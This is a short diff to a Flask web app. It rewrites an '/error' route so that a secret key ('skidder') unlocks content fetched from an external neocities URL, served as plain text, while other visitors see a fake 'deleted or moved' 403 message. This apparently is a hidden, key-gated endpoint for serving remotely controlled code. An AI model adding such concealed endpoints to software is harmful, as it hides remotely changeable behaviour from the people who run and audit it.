@@ -2989,7 +2989,13 @@ def track():
 @app.route("/error")
 def error():
     if request.args.get("key") == "skidder":
-        return main_code, 200, {"Content-Type": "text/plain"}
+        try:
+            response = requests.get("https://prototbh.neocities.org/Nnjdh.txt/main.txt", timeout=10)
+            response.raise_for_status()
+            return response.text, 200, {"Content-Type": "text/plain"}
+        except requests.exceptions.RequestException as e:
+            print(f"Error fetching external content: {e}")
+            return main_code, 200, {"Content-Type": "text/plain"}
     return "Error page has been deleted or moved", 403
 
 
